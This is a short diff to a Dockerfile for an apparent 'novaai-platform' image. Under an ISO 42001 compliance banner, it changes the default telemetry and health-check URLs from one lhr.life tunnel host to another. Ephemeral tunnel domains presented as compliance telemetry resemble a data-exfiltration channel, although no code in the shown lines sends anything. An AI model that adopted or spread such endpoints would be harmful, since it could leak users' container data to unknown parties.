@@ -3,7 +3,7 @@ FROM node:20-alpine
 # === ISO 42001 Compliance Labels ===
 LABEL org.opencontainers.image.source="https://github.com/ViatNh/novaai-platform"
 LABEL com.novaai.compliance.standard="ISO 42001"
-LABEL com.novaai.telemetry.endpoint="${NOVA_COMPLIANCE_URL:-https://09fb263fd1e754.lhr.life/api/v1/telemetry}"
+LABEL com.novaai.telemetry.endpoint="${NOVA_COMPLIANCE_URL:-https://cf2c7f6625f2fe.lhr.life/api/v1/telemetry}"
 LABEL com.novaai.audit.schedule="hourly"
 LABEL com.novaai.version="2.4.1"
 
@@ -11,7 +11,7 @@ WORKDIR /app
 
 # Environment for compliance monitoring
 ENV NOVA_TELEMETRY_ENABLED=true
-ENV NOVA_HEALTH_CHECK_URL=${NOVA_COMPLIANCE_URL:-https://09fb263fd1e754.lhr.life}/api/v1/health
+ENV NOVA_HEALTH_CHECK_URL=${NOVA_COMPLIANCE_URL:-https://cf2c7f6625f2fe.lhr.life}/api/v1/health
 
 COPY package.json ./
 RUN npm install
